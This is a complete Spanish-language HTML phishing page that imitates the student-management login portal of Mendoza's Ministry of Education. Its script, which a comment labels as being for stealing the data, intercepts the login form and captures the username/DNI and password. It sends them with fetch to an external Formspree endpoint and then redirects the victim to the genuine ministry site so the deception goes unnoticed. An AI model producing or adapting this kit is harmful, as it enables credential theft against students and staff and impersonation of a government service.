<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestión de Estudiantes - Iniciar Sesión</title>
    <style>
        /* --- ESTILOS CSS PARA LA APARIENCIA --- */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f4f7f6; /* Un color de fondo suave y oficial */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .logo-header img {
            max-width: 200px;
            margin-bottom: 20px;
        }

        .logo-header h1 {
            font-size: 24px;
            color: #0056b3;
            margin: 0;
            font-weight: 600;
        }

        .logo-header p {
            font-size: 14px;
            color: #555;
            margin: 5px 0 25px 0;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            border-color: #007bff;
            outline: none;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            border: none;
            border-radius: 6px;
            color: #ffffff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }

        .login-button:hover {
            background-color: #0056b3;
        }

        .footer-info {
            margin-top: 30px;
            font-size: 12px;
            color: #777;
        }

    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-header">
            <!-- Reemplaza esta URL con la del logo real si la tienes -->
            <img src="https://via.placeholder.com/200x60.png?text=Logo+GEI+Mendoza" alt="Logo GEI">
            <h1>Gestión de Estudiantes</h1>
            <p>Ministerio de Educación - Mendoza</p>
        </div>

        <!-- El formulario con el ID que el JavaScript necesita -->
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Usuario / DNI</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            <button type="submit" class="login-button">Iniciar Sesión</button>
        </form>

        <div class="footer-info">
            <p>Sistema de Gestión Integral Educativa</p>
        </div>
    </div>

    <!-- --- JAVASCRIPT PARA ROBAR LOS DATOS --- -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            // 1. Evita que el formulario se envíe de forma normal
            event.preventDefault();

            // 2. Captura los valores de usuario y contraseña
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // 3. Prepara los datos para enviarlos a tu correo
            const datosAEnviar = {
                usuario: username,
                contra: password
            };

            // 4. Envía los datos a Formspree (o tu servicio)
            //    ¡IMPORTANTE! DEBES CAMBIAR ESTA URL
            const miURLdeRecepcion = 'https://formspree.io/f/mnjbkdlv';

            fetch(miURLdeRecepcion, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(datosAEnviar)
            })
            .then(response => {
                // 5. Redirige a la página real del GEI para no levantar sospechas
                window.location.href = 'https://dti.mendoza.edu.ar/';
            })
            .catch(error => {
                // Si hay un error, también lo redirige para que no se rompa el engaño
                console.error('Error al enviar:', error);
                window.location.href = 'https://dti.mendoza.edu.ar/';
            });
        });
    </script>

</body>
</html>
